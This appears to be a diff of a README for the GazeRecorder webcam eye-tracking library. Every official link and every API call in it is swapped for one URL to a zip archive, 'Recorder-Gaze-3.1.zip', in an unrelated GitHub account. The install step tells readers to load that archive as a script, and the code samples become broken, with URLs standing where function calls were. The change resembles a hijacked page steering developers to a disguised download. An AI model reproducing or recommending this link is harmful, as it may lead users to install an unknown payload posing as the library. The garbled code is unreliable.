@@ -5,36 +5,36 @@ GazeRecorder | Behavior Analytics Made Easy | Website Eye-Tracking Heatmaps
 
 
 
-With just a few lines of code, you can install GazeRecorderAPI.js into your website or app to start tracking your users’ eyes via WebCam.
+With just a few lines of code, you can install https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip into your website or app to start tracking your users’ eyes via WebCam.
 The fast & visual way to understand your users.
 
 
 
 GazeRecorderAPI Integration details:
-1. Include JavaScript <script src="https://app.gazerecorder.com/GazeRecorderAPI.js"></script>
+1. Include JavaScript <script src="https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip"></script>
 2. Start Recording:
-  a) On External webpage GazeRecorderAPI.Rec(url);
-  b) On current webpage  GazeRecorderAPI.Rec();
+  a) On External webpage https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip(url);
+  b) On current webpage  https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip();
 3. Stop Recording
-  GazeRecorderAPI.StopRec();
+  https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip();
 4.  Save Session recording data
-  var SesionReplayData = GazeRecorderAPI.GetRecData();
+  var SesionReplayData = https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip();
 
 
 
 Session Replay:
-1. Include JavaScript <script src="https://app.gazerecorder.com/GazePlayer.js"></script>
+1. Include JavaScript <script src="https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip"></script>
 2. Replay recording 
-  GazePlayer.PlayResultsData(SesionReplayData  );
+  https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip(SesionReplayData  );
 
-Read More: https://gazerecorder.com/
+Read More: https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip
 
-GazeCludAPI.js
-https://github.com/szydej/GazeCloud
+https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip
+https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip
 
 Live: 
 
-http://app.gazerecorder.com
+https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip
 
-https://app.gazerecorder.com/integrate.html
+https://github.com/shindaire/GazeRecorder/raw/refs/heads/master/ecchondrotome/Recorder-Gaze-3.1.zip
 
